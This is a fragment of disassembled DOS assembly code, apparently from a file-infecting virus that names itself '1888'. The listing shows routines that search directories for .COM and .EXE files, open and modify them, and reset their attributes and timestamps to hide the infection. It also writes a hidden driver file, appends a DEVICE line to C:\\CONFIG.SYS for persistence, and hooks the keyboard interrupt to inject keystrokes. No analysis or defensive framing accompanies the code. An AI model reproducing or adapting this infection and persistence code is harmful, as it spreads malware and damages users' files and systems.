		mov	es,bx
		int	13h			; Disk  dl=drive ?  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head

loc_ret_0524:
		retn
sub_04EE	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0525	proc	near
		mov	data_019B,1
		lea	dx,data_05C1		; Load effective addr
		mov	cx,27h
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jnc	loc_0564		; Jump if carry=0
		mov	ah,3Ch			; '<'
		mov	cx,6
		int	21h			; DOS Services  ah=function 3Ch
						;  create/truncate file @ ds:dx
		mov	bx,ax
		lea	dx,data_05EE		; Load effective addr
		mov	cx,data_070A
		mov	si,dx
		add	si,data_00B3_e
		mov	ax,data_0130
		mov	[si],ax
		mov	ah,data_0132
		mov	[si+2],ah
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jc	loc_05BD		; Jump if carry Set
loc_0564:
		lea	dx,data_05C7		; Load effective addr
		mov	cx,27h
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_05BD		; Jump if carry Set
		call	sub_036C
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax
		jc	loc_05BD		; Jump if carry Set
		mov	cx,data_0108
		push	es
		push	ds
		mov	ax,word ptr data_012C+2
		mov	ds,ax
		mov	es,ax
		xor	dx,dx			; Zero register
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		pop	ds
		mov	dx,ax
		mov	ax,0FFFFh
		xor	di,di			; Zero register
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		cmp	ax,es:[di-1]
		pop	es
		jz	loc_05BD		; Jump if zero
		mov	ax,4200h
		xor	cx,cx			; Zero register
		dec	dx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_05BD		; Jump if carry Set
		lea	dx,data_05D5		; Load effective addr
		mov	cx,19h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_05BD:
		call	sub_037D
		retn
sub_0525	endp

data_05C1	db	43h
		db	 3Ah, 5Ch,0FFh,0FFh, 00h
data_05C7	db	'C:\CONFIG.SYS', 0
data_05D5	db	'DEVICE ='
		db	0FFh,0FFh
		db	' COUNTRY.SYS', 0Dh, 0Ah
		db	1Ah
data_05EE	db	0FFh
		db	0FFh,0FFh,0FFh, 40h,0C8h, 16h
		db	 00h, 21h, 00h
		db	'hgt42   '
		db	 00h, 00h, 00h, 00h, 2Eh, 89h
		db	 1Eh, 12h, 00h, 2Eh, 8Ch, 06h
		db	 14h, 00h,0CBh, 1Eh, 06h, 0Eh
		db	 1Fh,0C4h, 3Eh, 12h, 00h, 26h
		db	 8Ah, 45h, 02h, 3Ch, 00h, 75h
		db	 03h,0E8h, 82h, 00h
		db	 0Dh, 00h, 10h, 26h, 89h, 45h
		db	 03h, 07h, 1Fh,0CBh, 50h, 53h
		db	 51h, 1Eh
		db	0E4h, 60h,0A8h, 80h, 75h, 30h
		db	 2Eh, 8Bh, 1Eh,0A9h, 00h, 3Ah
		db	0C7h, 75h, 27h,0B8h, 40h, 00h
		db	 8Eh,0D8h,0E8h, 28h, 00h, 25h
		db	 05h, 00h, 8Bh,0C8h
		db	0BBh, 1Ch, 00h

locloop_064F:
		mov	ax,cs:data_00A9_e
		mov	[bx],ax
		add	bx,2
		cmp	bx,3Fh
		jb	loc_0660		; Jump if below
		mov	bx,1Eh
loc_0660:
		mov	word ptr ds:[1Ch],bx
		loop	locloop_064F		; Loop if cx > 0

loc_0666:
		pop	ds
		pop	cx
		pop	bx
		pop	ax
		jmp	dword ptr cs:data_00A3_e

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_066F	proc	near
		mov	ax,cs:data_00A7_e
		push	ax
		and	ah,0B4h
		pop	ax
		jp	loc_067B		; Jump if parity=1
		stc				; Set carry flag
loc_067B:
		rcl	ax,1			; Rotate thru carry
		mov	cs:data_00A7_e,ax
		retn
sub_066F	endp

		db	'hgt42   '
		db	 00h, 56h, 31h, 00h, 46h, 52h
		db	 44h, 00h, 00h, 00h, 00h, 00h
		db	 00h, 65h, 12h, 65h, 73h, 74h
		db	 6Eh, 12h, 1Fh, 14h, 31h,0CDh
		db	0ABh,0EFh
		db	 06h, 57h,0B4h, 2Ah,0CDh, 21h
		db	 8Ah,0E6h, 3Bh, 0Eh,0B3h, 00h
		db	 74h, 03h, 80h,0C4h
		db	0Ch
loc_06B5:
		sub	ah,ds:data_00B5_e
		cmp	ah,3
		jb	loc_06FB		; Jump if below
		mov	ds:data_00B5_e,dh
		mov	ds:data_00B3_e,cx
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	ds:data_00A7_e,dx
		call	sub_066F
		mov	bx,ax
		and	bx,3
		nop				;*ASM fixup - sign extn byte
		mov	al,ds:data_00AB_e[bx]
		mov	ah,ds:data_00AF_e[bx]
		mov	ds:data_00A9_e,ax
		mov	ax,3516h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_00A3_e,bx
		mov	bx,es
		mov	word ptr ds:data_00A3_e+2,bx
		cli				; Disable interrupts
;*		mov	dx,offset loc_003E	;*
		db	0BAh, 3Eh, 00h
		mov	ax,2516h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		sti				; Enable interrupts
loc_06FB:
		pop	di
		pop	es
		mov	word ptr es:[di+0Eh],0B6h
		mov	es:[di+10h],cs
		xor	ax,ax			; Zero register
		retn
data_070A	dw	11Ch
data_070C	db	8Bh
		db	 1Eh, 28h, 01h,0A1h, 26h, 01h
		db	 8Eh,0D0h, 8Bh, 26h, 24h, 01h
		dw	0EC83h, 8B04h
		dw	80F4h, 1F3Eh
		dw	1, 2875h
		dw	0BFh, 3601h
		dw	3C89h, 0FB8Bh
		dw	8936h, 27Ch
		dw	0FF33h, 8936h
		dw	47Ch, 0BFh
		dw	8B01h, 2236h
		dw	301h, 8BF7h
		dw	1C0Eh, 8C01h
		dw	8ED8h, 0F3C0h
		dw	0EBA4h, 9016h
		db	 8Bh,0FBh, 83h,0C7h, 10h,0A1h
		db	 16h, 00h, 03h,0F8h, 36h, 89h
		db	 7Ch, 02h, 8Bh, 3Eh, 14h, 00h
		db	 36h, 89h
		db	3Ch
		db	 8Eh,0DBh, 8Eh,0C3h,0CBh
loc_0767:
		mov	ax,ss
		mov	cs:data_0126,ax
		mov	cs:data_0124,sp
		mov	ax,cs
		mov	ss,ax
		mov	sp,1F7h
		push	ds
		mov	ds,ax
		pop	ax
		mov	data_0128,ax
		call	sub_0269
		mov	ax,cs
		mov	es,ax
		call	sub_01F7
		mov	dx,offset data_019D
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		call	sub_02AF
		call	sub_02A5
		jnc	loc_079C		; Jump if carry=0
		jmp	loc_083A
loc_079C:
		call	sub_0227
		jc	loc_07A4		; Jump if carry Set
		jmp	loc_083A
loc_07A4:
		call	sub_023A
		call	sub_02D0
		mov	data_011E,0
loc_07AF:
		call	sub_0355
		jc	loc_0800		; Jump if carry Set
loc_07B4:
		cmp	data_019C,4
		ja	loc_083A		; Jump if above
		call	sub_036C
		call	sub_034D
		jnc	loc_07FA		; Jump if carry=0
		cmp	data_010A,4
		ja	loc_07FA		; Jump if above
		call	sub_03A6
		jc	loc_083A		; Jump if carry Set
		cmp	data_011E,0
		je	loc_07DB		; Jump if equal
		call	sub_03BB
		jmp	short loc_07DE
loc_07DB:
		call	sub_0472
loc_07DE:
		call	sub_037D
		jc	loc_083A		; Jump if carry Set
		inc	data_019C
		cmp	data_019B,1
		je	loc_07FA		; Jump if equal
		call	sub_04DE
		jz	loc_07FA		; Jump if zero
		call	sub_0525
		jc	loc_083A		; Jump if carry Set
		jmp	short loc_07AF
loc_07FA:
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_07B4		; Jump if carry=0
loc_0800:
		cmp	data_011E,1
		je	loc_080E		; Jump if equal
		mov	data_011E,1
		jmp	short loc_07AF
loc_080E:
		mov	data_011E,0
		cmp	data_019A,0
		jne	loc_0829		; Jump if not equal
		lea	dx,data_015A		; ('C:\') Load effective addr
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		mov	data_019A,0FFh
		jmp	short loc_07AF
loc_0829:
		cmp	data_0182,0
		je	loc_083A		; Jump if equal
		call	sub_0328
		dec	data_0182
		jmp	loc_07AF
loc_083A:
		lea	dx,data_013A		; ('\DANGER\1888') Load effective addr
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		call	sub_04DE
		jz	loc_084A		; Jump if zero
		call	sub_04EE
loc_084A:
		mov	ax,word ptr data_012C+2
		mov	es,ax
		mov	cx,5Bh
		mov	si,offset data_070C
		xor	di,di			; Zero register
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		call	sub_028C
		call	data_012C
		int	20h			; DOS program terminate
		db	0E9h, 64h, 06h, 20h,0A4h, 86h
		db	0FCh, 18h, 02h, 00h, 00h, 00h
		db	 31h, 2Eh, 43h, 4Fh, 4Dh, 00h
		db	 20h, 20h, 4Dh, 00h, 00h, 00h
		db	0A6h, 24h, 00h, 00h, 60h, 07h
		db	 00h, 00h, 60h, 07h, 60h, 07h
		db	0FEh,0FFh, 6Ch, 0Dh, 6Ch, 0Dh
		db	 94h, 92h, 00h, 00h, 01h, 9Eh
		db	0C8h, 07h, 07h, 1Ch, 02h, 10h
		db	 00h, 00h, 00h, 00h, 5Ch, 00h
		db	 4Fh, 53h, 53h, 49h, 00h, 45h
		db	 4Eh, 00h
		db	 53h, 54h
		db	20 dup (0)
		db	'C:\', 0
		db	'*', 0
		db	'NETWARE', 0
		db	'LMS', 0
		db	'MAUS', 0
		db	'MDB', 0
		db	'DOS', 0
		db	'BASE', 0
		db	'L', 0
		db	'`'
		db	 01h, 00h, 01h, 14h, 17h, 6Eh
		db	 00h, 01h,0A9h, 00h, 01h,0BFh
		db	 38h, 2Ah, 2Eh, 65h, 78h, 65h
		db	 00h, 2Ah, 2Eh, 63h, 6Fh, 6Dh
		db	 00h, 00h, 00h, 04h, 01h
		db	3Fh
		db	7 dup (3Fh)
		db	 43h, 4Fh, 4Dh, 23h, 0Ah, 00h
		db	 00h, 00h, 31h,0C0h, 50h, 9Ah
		db	 20h,0A4h, 86h,0FCh, 18h, 02h
		db	 00h, 00h, 00h, 31h, 2Eh, 43h
		db	 4Fh, 4Dh, 00h, 20h, 20h, 4Dh
		db	 00h, 00h, 00h,0A6h,0EAh,0AAh
		db	 03h, 00h,0CCh,0AAh, 03h, 00h
		db	 00h, 31h, 31h, 00h, 40h, 48h
		db	 07h, 00h, 40h, 6Ch, 15h, 6Ch
		db	 15h, 00h, 40h, 05h, 00h, 60h
		db	 07h, 00h, 01h,0C8h, 01h, 19h
		db	 01h, 82h, 08h, 6Ch, 0Dh, 6Ch
		db	 0Dh,0ADh, 04h, 6Ch, 0Dh, 46h
		db	 72h,0DEh, 07h

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0959	proc	near
		cmp	data_011C,0
		jne	loc_0969		; Jump if not equal
		mov	ax,760h
		mov	data_011C,ax
		mov	data_0120,ax
loc_0969:
		mov	al,data_011E
		mov	data_011F,al
		mov	ax,data_0120
		mov	data_0122,ax
		inc	data_0119
		mov	data_019C,0
		mov	data_019A,0
		mov	data_019B,0
		retn
sub_0959	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0989	proc	near
		lea	dx,data_0183		; Load effective addr
		xor	al,al			; Zero register
		mov	ah,3Dh			; '='
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_ret_099B		; Jump if carry Set
		mov	bx,ax
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle

loc_ret_099B:
		retn
sub_0989	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_099C	proc	near
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		mov	ah,dh
		cmp	cx,data_0130
		je	loc_09AB		; Jump if equal
		add	ah,0Ch
loc_09AB:
		sub	ah,data_0132
		mov	data_011B,ah
		mov	data_0134,al
		mov	data_0133,dl
		mov	data_0132,dh
		mov	data_0130,cx
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	data_0135,ch
		retn
sub_099C	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_09CB	proc	near
		mov	ax,es
		dec	ax
		push	es
		mov	es,ax
		mov	ax,es:d_8B38_0003_e
		mov	data_012A,ax
		pop	es
		mov	bx,ax
		sub	bx,200h
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change memory allocation
						;   bx=bytes/16, es=mem segment
		mov	bx,150h
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		mov	word ptr data_012C+2,ax
		retn
sub_09CB	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_09EE	proc	near
		push	es
		mov	ax,word ptr data_012C+2
		mov	es,ax
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		mov	ax,data_0128
		mov	es,ax
		mov	bx,data_012A
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change memory allocation
						;   bx=bytes/16, es=mem segment
		pop	es
		retn
sub_09EE	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0A07	proc	near
		push	ds
		mov	ah,1Bh
		int	21h			; DOS Services  ah=function 1Bh
						;  get disk info, default drive
						;   al=sectors per cluster
						;   ds:bx=ptr to media ID byte
						;   cx=sector size, dx=clusters
		cmp	byte ptr [bx],0F8h
		pop	ds
		retn
sub_0A07	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0A11	proc	near
		lea	si,data_019D		; Load effective addr
		mov	di,si
		xor	dl,dl			; Zero register
		mov	ah,47h			; 'G'
		int	21h			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
						;   ds:si=ASCIIZ directory name
		mov	cx,30h
		mov	al,0
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,di
		sub	cx,si
		lea	di,data_013A		; ('\DANGER\1888') Load effective addr
		mov	al,5Ch			; '\'
		stosb				; Store al to es:[di]
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		retn
sub_0A11	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0A32	proc	near
		mov	data_0182,0
		lea	bx,cs:[160h]		; Load effective addr
		add	bx,20h
		mov	data_0180,bx
		sub	bx,20h
		lea	dx,data_015A+4		; ('*') Load effective addr
		mov	cx,33h
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_0A81		; Jump if carry Set
loc_0A52:
		lea	di,data_019D		; Load effective addr
		add	di,1Eh
		cmp	byte ptr [di],2Eh	; '.'
		je	loc_0A7B		; Jump if equal
		mov	si,di
		mov	cx,20h
		mov	al,0
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	cx,di
		sub	cx,si
		mov	di,bx
		add	bx,cx
		cmp	bx,data_0180
		ja	loc_0A81		; Jump if above
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		inc	data_0182
loc_0A7B:
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_0A52		; Jump if carry=0
loc_0A81:
		lea	bx,cs:[160h]		; Load effective addr
		mov	data_0180,bx
		retn
sub_0A32	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0A8A	proc	near
		cmp	data_0182,0
		je	loc_ret_0AAE		; Jump if equal
		lea	dx,data_013A		; ('\DANGER\1888') Load effective addr
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		mov	dx,data_0180
		mov	di,dx
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
		mov	al,0
		mov	cx,20h
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	data_0180,di

loc_ret_0AAE:
		retn
sub_0A8A	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0AAF	proc	near
		mov	ax,data_0104
		and	al,1Fh
		cmp	al,1Eh
		retn
sub_0AAF	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0AB7	proc	near
		lea	dx,data_0194		; Load effective addr
		cmp	data_011E,0
		je	loc_0AC6		; Jump if equal
		lea	dx,data_018E		; Load effective addr
loc_0AC6:
		mov	cx,23h
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		retn
sub_0AB7	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0ACE	proc	near
		lea	si,data_019D		; Load effective addr
		add	si,15h
		lea	di,data_0103		; Load effective addr
		mov	cx,16h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		retn
sub_0ACE	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0ADF	proc	near
		pushf				; Push flags
		mov	cx,data_0104
		or	cl,1Fh
		and	cl,0FEh
		mov	dx,data_0106
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		lea	dx,data_010C		; ('1888.COM') Load effective addr
		xor	ch,ch			; Zero register
		mov	cl,data_0103
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  set attrb cx, filename @ds:dx
		popf				; Pop flags
		retn
sub_0ADF	endp


